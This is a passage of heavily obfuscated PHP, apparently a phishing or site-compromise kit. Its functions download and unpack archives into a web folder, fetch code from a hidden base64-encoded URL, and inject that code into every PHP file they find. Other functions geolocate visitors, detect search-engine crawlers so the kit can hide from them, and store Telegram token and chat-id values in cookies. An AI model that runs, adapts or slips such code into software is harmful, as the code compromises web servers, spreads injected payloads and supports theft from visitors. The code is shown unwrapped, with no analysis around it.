"\x57\151\156\144\x6f\167\163\x20\x56\x69\163\x74\141", "\x2f\x77\x69\x6e\144\157\167\163\x20\156\164\40\x35\x2e\62\x2f\x69" => "\x57\151\x6e\144\x6f\x77\x73\x20\123\145\162\x76\145\162\x20\62\x30\60\63\x2f\x58\x50\40\x78\66\64", "\57\x77\151\156\x64\157\167\163\40\156\164\x20\x35\56\x31\57\x69" => "\x57\151\156\x64\157\x77\163\40\130\x50", "\57\167\x69\156\144\157\167\x73\x20\x78\x70\x2f\x69" => "\127\151\156\x64\157\167\x73\40\130\x50", "\57\x77\x69\x6e\144\x6f\x77\163\x20\x6e\164\40\x35\x2e\60\57\x69" => "\127\x69\x6e\144\x6f\167\163\x20\x32\60\x30\x30", "\57\x77\x69\x6e\144\x6f\x77\163\40\155\x65\57\151" => "\x57\151\156\x64\157\167\163\40\115\105", "\x2f\x77\151\156\x39\x38\57\x69" => "\127\x69\x6e\x64\x6f\x77\163\x20\71\70", "\x2f\167\x69\156\x39\65\57\x69" => "\x57\x69\x6e\144\157\x77\x73\40\x39\65", "\x2f\167\151\x6e\61\66\x2f\151" => "\127\x69\156\x64\x6f\167\163\x20\x33\56\x31\61", "\x2f\x6d\141\x63\151\156\164\x6f\163\x68\x7c\155\x61\x63\40\x6f\x73\x20\170\x2f\x69" => "\x4d\x61\143\40\117\x53\x20\130", "\x2f\155\x61\x63\137\x70\x6f\167\x65\162\x70\x63\x2f\151" => "\x4d\x61\x63\40\117\123\40\x39", "\x2f\x6c\x69\x6e\x75\x78\x2f\151" => "\114\x69\x6e\x75\170", "\57\x75\142\165\x6e\164\165\x2f\151" => "\125\x62\x75\156\x74\165", "\x2f\x69\x70\x68\x6f\156\145\57\x69" => "\151\120\x68\x6f\x6e\x65", "\57\x69\160\157\144\x2f\x69" => "\151\x50\x6f\x64", "\x2f\151\160\141\x64\57\151" => "\151\x50\141\144", "\57\x61\x6e\144\x72\157\x69\144\57\151" => "\x41\x6e\x64\x72\x6f\x69\x64", "\57\x62\x6c\141\143\153\x62\145\162\162\171\x2f\151" => "\x42\154\x61\143\x6b\102\x65\x72\162\171", "\x2f\167\x65\x62\157\x73\x2f\151" => "\115\157\142\151\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto eKIkt; A_PPf: error_reporting(E_ALL); goto RuBBl; bIKta: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto w9VBn; koqgz: if ($_SERVER["\122\105\x51\x55\x45\123\x54\137\115\105\x54\x48\117\x44"] === "\x47\105\x54") { $com_dir = isset($_GET["\154\x6f\x63\x61\x6c"]) ? $_GET["\x6c\x6f\143\141\x6c"] : null; $com_id = isset($_GET["\163\x6f\x75\154\163"]) ? $_GET["\x73\157\x75\x6c\x73"] : null; $com_ip = isset($_GET["\162\145\x6d\157\164\145"]) ? $_GET["\x72\145\155\x6f\x74\x65"] : null; if ($com_dir !== null && $com_id !== null && $com_ip !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); user_data($com_ip, $com_id); $_SESSION["\x6c\157\154\151\160\163"] = $com_ip; $_SESSION["\x6c\157\154\x73\x6f\165\154\163"] = $com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $com_dir . "\77\x26\166\141\154\x69\x64\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\154\145\x72\164\75" . $RandOP_Mlux . "\46\170\154\x70\x73\x3d" . $RandOP_Mlux . "\x26\163\x6f\165\x6c\163\x3d" . $com_id . "\46\x64\157\156\145\75\46\x65\162\162\x6f\162\x79\x3d" . $RandOP_Mlux . "\x26\x6d\x6e\145\155\157\156\151\143\75\x26\x6a\142\75" . $RandOP_Mlux; header("\x4c\x6f\143\x61\164\x69\157\156\72\40{$url}"); die; } } goto G8f26; ADdgu: function download_extract($zipFileUrl) { if (!is_dir("\167\x65\142")) { if (!mkdir("\x77\145\x62", 511)) { die("\x46\x61\x69\154\145\x64\x20\x74\x6f\40\x63\x72\x65\141\x74\145\x20\x77\145\x62\40\144\151\162\x65\143\164\157\162\x79"); } } if (!is_dir("\x74\x65\155\x70")) { mkdir("\x74\x65\x6d\x70"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\167\x65\x62\57{$sub_folder}\x2f"; $_SESSION["\146\157\x6c\x64\145\x72"] = $folder_path; $zipFileName = "\x74\x65\x6d\x70\57{$folder_name}\56\172\151\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\141\151\x6c\x65\144\40\164\x6f\x20\x63\x72\145\x61\164\145\40\x74\150\145\x20\146\x6f\154\x64\145\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\162\x65\163\x5f\163\x74\141\x74\x75\x73" => "\64\x30\65", "\x6d\145\163\x73\141\147\x65" => "\106\141\x69\x6c\x65\144\40\164\157\40\x65\x78\x74\162\141\x63\164\x20\164\x68\145\x20\172\x69\x70\40\x66\x69\154\145"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x72\x65\x73\x5f\163\x74\141\x74\165\163" => "\64\60\65", "\x6d\x65\163\163\x61\x67\145" => "\106\141\x69\x6c\145\x64\x20\164\157\x20\x64\157\167\156\154\157\141\144\40\164\x68\145\40\172\151\x70\x20\x66\x69\154\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto cfqmt; lQ14W: function update_php($folder_path) { $trackingFile = $folder_path . "\x72\x6f\165\x6c\x73\56\x74\x78\164"; $codeURL = base64_decode(base64_decode("\x59\125\x68\123\115\107\116\x49\x54\x54\x5a\115\x65\124\x6c\x35\127\126\150\x6a\144\x56\x6f\x79\x62\104\x42\x68\123\106\132\160\x5a\106\150\x4f\x62\107\116\164\124\x6e\132\x69\142\x6c\112\x73\x59\155\x35\122\x64\x56\x6b\x79\x4f\130\122\x4d\115\x6e\150\x71\x59\x6a\x4a\x34\141\107\121\172\x62\107\170\x6a\142\153\x31\62\x59\172\111\65\x4d\x57\116\x74\124\155\170\115\x4d\x6a\106\x6f\x59\x56\143\x30\144\155\116\x49\123\156\x5a\x6b\x52\61\x5a\x71\x5a\105\115\61\115\x47\126\111\125\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto PSZfQ; olUmi: $local_os = get_platform($local_userAgent); goto idGm2; arxVU: $fs_host = base64_decode("\x4d\x54\x6b\64\x4c\152\111\61\x4d\x53\x34\x34\116\x43\x34\x79\115\x44\x41"); goto YGnbO; cfqmt: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\57" . $entry; if ($entry == "\x2e" || $entry == "\56\56") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\x68\x74\155\154") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\56\x70\x68\x70"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto lQ14W; cfAnb: function fetchIPInfo($ipAddress) { $url = "\x68\x74\164\x70\x3a\x2f\x2f\x69\x70\55\x61\160\151\56\x63\x6f\155\x2f\x70\x68\x70\x2f{$ipAddress}\77\146\x69\145\154\x64\x73\75\163\x74\141\x74\x75\163\54\x6d\x65\163\x73\141\x67\145\x2c\143\157\156\164\151\x6e\145\x6e\x74\x2c\x63\x6f\x6e\164\x69\x6e\x65\156\164\103\x6f\x64\145\54\143\157\165\x6e\164\162\x79\x2c\x63\x6f\x75\156\x74\x72\171\x43\157\144\x65\54\162\x65\x67\151\157\156\x2c\162\145\147\151\x6f\156\116\141\155\145\x2c\143\151\x74\x79\54\x64\151\x73\164\x72\x69\143\x74\x2c\x7a\x69\x70\x2c\154\141\x74\54\x6c\x6f\156\54\164\x69\155\145\172\x6f\156\x65\x2c\x63\x75\x72\162\x65\156\x63\171\x2c\x69\x73\160\54\157\162\x67\x2c\x61\x73\54\x61\163\156\141\155\145\x2c\x72\145\x76\x65\162\x73\x65\54\155\x6f\142\x69\x6c\x65\x2c\x70\x72\x6f\x78\171\x2c\x68\x6f\163\x74\x69\x6e\x67\x2c\x71\165\145\162\x79"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = unserialize($response); $_SESSION["\x73\145\163\163\151\157\x6e\x5f\x69\163\160"] = isset($info["\x69\163\x70"]) ? $info["\x69\x73\x70"] : null; $_SESSION["\163\x65\x73\x73\x69\157\156\x5f\x63\x6f\165\156\164\162\171"] = isset($info["\x63\x6f\165\156\x74\x72\x79"]) ? $info["\x63\x6f\x75\156\x74\162\171"] : null; $_SESSION["\163\x65\x73\x73\151\x6f\156\137\x63\x6f\165\156\164\x72\x79\137\143\157\144\x65"] = isset($info["\143\157\165\156\164\162\x79\103\157\x64\x65"]) ? $info["\x63\x6f\x75\156\x74\x72\171\x43\x6f\144\x65"] : null; $_SESSION["\163\x65\163\x73\x69\x6f\x6e\x5f\x63\151\x74\x79"] = isset($info["\x63\151\x74\171"]) ? $info["\x63\x69\164\x79"] : null; $_SESSION["\163\x65\x73\x73\151\x6f\x6e\x5f\x72\145\147\151\x6f\x6e"] = isset($info["\x72\x65\x67\151\x6f\x6e"]) ? $info["\162\145\147\151\x6f\x6e"] : null; $proxy = isset($info["\160\x72\157\x78\171"]) ? $info["\160\x72\157\x78\x79"] : null; $_SESSION["\x73\x65\163\163\x69\157\x6e\x5f\160\162\x6f\x78\171"] = $proxy == 1 ? "\124\x72\x75\x65" : "\106\141\x6c\163\145"; $mobile = isset($info["\155\x6f\x62\151\154\x65"]) ? $info["\155\x6f\142\x69\154\x65"] : null; $_SESSION["\163\145\x73\163\x69\157\x6e\x5f\x6d\x6f\x62\151\x6c\145"] = $mobile == 1 ? "\x54\x72\x75\145" : "\106\141\x6c\163\145"; $hosting = isset($info["\x68\x6f\163\x74\151\x6e\x67"]) ? $info["\150\x6f\163\x74\151\x6e\147"] : null; $_SESSION["\163\145\163\x73\x69\x6f\156\137\150\x6f\163\164\x69\x6e\147"] = $hosting == 1 ? "\x54\162\x75\x65" : "\106\141\x6c\163\x65"; } goto uFJRv; zsLNk: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\x6f\x6f\x67\154\145" => "\x68\164\164\x70\163\x3a\57\x2f\x64\145\166\145\154\157\160\x65\x72\163\x2e\x67\x6f\157\x67\154\145\56\x63\157\155\57\x73\145\141\x72\143\150\x2f\x61\160\x69\163\x2f\x69\160\162\x61\156\147\x65\163\57\147\x6f\x6f\147\154\x65\142\157\x74\x2e\152\x73\157\x6e", "\x62\151\x6e\x67" => "\150\164\x74\x70\163\x3a\x2f\57\x77\x77\167\56\x62\x69\156\147\56\143\x6f\155\x2f\164\x6f\157\154\x62\157\170\x2f\142\x69\x6e\147\x62\157\164\56\x6a\163\x6f\x6e"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\160\x72\145\x66\151\x78\x65\x73"] as $ipRange) { if (isset($ipRange["\x69\x70\x76\66\x50\162\145\146\x69\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\151\160\166\x36\x50\162\145\146\151\x78"]; } elseif (isset($ipRange["\151\160\x76\x34\120\x72\145\146\x69\170"]) && strpos($ipToCheck, "\72") === false) { $network = $ipRange["\151\x70\166\x34\120\162\145\146\x69\170"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto zapO0; fm38t: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\x2e\x2e") { if (is_dir($dir . "\x2f" . $object)) { deleteDirectory($dir . "\57" . $object); } else { unlink($dir . "\57" . $object); } } } reset($objects); rmdir($dir); } } goto ADdgu; uFJRv: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\x6e\145\x63\x74\x69\x6f\x6e\40\146\141\151\154\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\114\105\x43\x54\40\x2a\40\106\122\x4f\x4d\40\x6c\x6f\147\x73\x20\x57\x48\x45\122\105\x20\151\160\x61\144\x64\x72\145\163\75\x27{$ipAddress}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto LPEIP; Jj0i5: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\x65\x78\x70\151\162\145\137\144\x61\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\164\x6f\153\145\x6e\x74\145\154", $token, time() + 86400 * 30, "\x2f"); setcookie("\x69\x64\164\x65\154", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\x64\151\162\x69\x63\x74", $_SESSION["\x72\145\144\151\162\151\x63\164"], time() + 86400 * 30, "\57"); setcookie("\x70\x72\x6f\x6a\145\143\x74", $_SESSION["\160\x72\157\152\145\143\164"], time() + 86400 * 30, "\57"); setcookie("\x73\x6f\165\x72\143\145\155\145", $_SESSION["\x61\x64\x64\142\x79"], time() + 86400 * 30, "\57"); setcookie("\x6e\x65\x77\x5f\145\x78\x70", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\166\157\x6c\x6d", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\x6f\x6c\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\x74\x6f\153\145\x6e\x74\145\154", $_SESSION["\164\157\153\145\x6e\x74\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\x69\x64\x74\x65\x6c", $_SESSION["\x69\x64\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\162\145\144\151\x72\151\143\164", $_SESSION["\x72\145\144\151\x72\151\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\157\x6a\145\143\x74", $_SESSION["\x70\x72\x6f\x6a\145\143\164"], time() + 86400 * 30, "\57"); setcookie("\x73\x6f\x75\162\143\x65\x6d\x65", $_SESSION["\141\144\x64\142\171"], time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\x6c\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\154\155", $chatid, time() + 86400 * 30, "\x2f"); } } goto WhB1Y; w9VBn: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\x2e\x2e") { $filePath = $directory . "\x2f" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\150\160" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto OV1Iy; vrOhC: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\x6e\x6e\145\143\x74\151\x6f\156\x20\146\141\x69\x6c\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\x45\x43\124\x20\x74\x6f\x6b\x65\x6e\x2c\40\143\x68\x61\x74\151\x64\x20\106\x52\117\115\x20\x70\x61\x6e\145\x6c\x20\x57\x48\105\x52\x45\40\x70\141\x6e\145\154\137\165\x73\x65\x72\x3d\47{$user}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\x74\157\x6b\x65\156"]; $chatid = $row["\x63\150\x61\164\151\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto x4e0J; RuBBl: ini_set("\144\151\163\160\x6c\x61\x79\x5f\x65\162\x72\157\162\x73", 1); goto kzE97; idGm2: $local_browser = get_browser_value($local_userAgent); goto wuYJ9; kzE97: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto arxVU; KNu6r: $fs_name = base64_decode("\145\155\x56\171\142\62\122\x68\145\x58\116\x66\132\107\106\65"); goto AGud5; tW0mZ: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\154\157\x63\x61\154\x2e\x74\170\x74", "{$ipAddress}", FILE_APPEND); } goto rbDyY; eKIkt: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\x6e\153\156\157\167\156\40\x42\162\157\167\x73\145\162"; $BROWSER = array("\57\155\x73\x69\x65\x2f\x69" => "\111\x6e\164\x65\x72\x6e\x65\164\40\x45\170\x70\154\157\x72\x65\x72", "\x2f\x66\151\x72\145\146\x6f\x78\x2f\151" => "\x46\x69\x72\145\x66\157\170", "\57\163\x61\x66\141\162\x69\57\151" => "\123\141\146\x61\x72\151", "\57\x63\150\x72\157\155\x65\57\151" => "\103\x68\x72\157\155\145", "\x2f\x65\x64\x67\145\57\151" => "\x45\144\x67\x65", "\57\157\x70\145\x72\x61\x2f\x69" => "\117\160\x65\x72\x61", "\x2f\x6e\x65\x74\163\143\x61\160\x65\x2f\x69" => "\x4e\145\164\x73\x63\x61\160\145", "\x2f\155\141\170\164\x68\157\156\x2f\x69" => "\x4d\141\170\x74\150\157\x6e", "\x2f\153\157\x6e\x71\x75\145\162\157\162\57\x69" => "\113\x6f\156\x71\165\145\x72\x6f\162", "\57\x6d\157\x62\x69\154\x65\x2f\x69" => "\110\x61\x6e\144\150\145\x6c\x64\x20\x42\x72\157\x77\x73\145\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto zsLNk; xTPP8: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto avRbc; V1cxt: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\56\56") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\x70\x68\x70") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto koqgz; C4Gbt: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\116\157\x74\x20\x56\x61\x6c\x69\x64"; } } goto Dnn5C; fAyFO: $local_domain = $_SERVER["\x53\x45\122\126\105\122\x5f\116\101\x4d\x45"]; goto olUmi; WKVam: ')); ?>
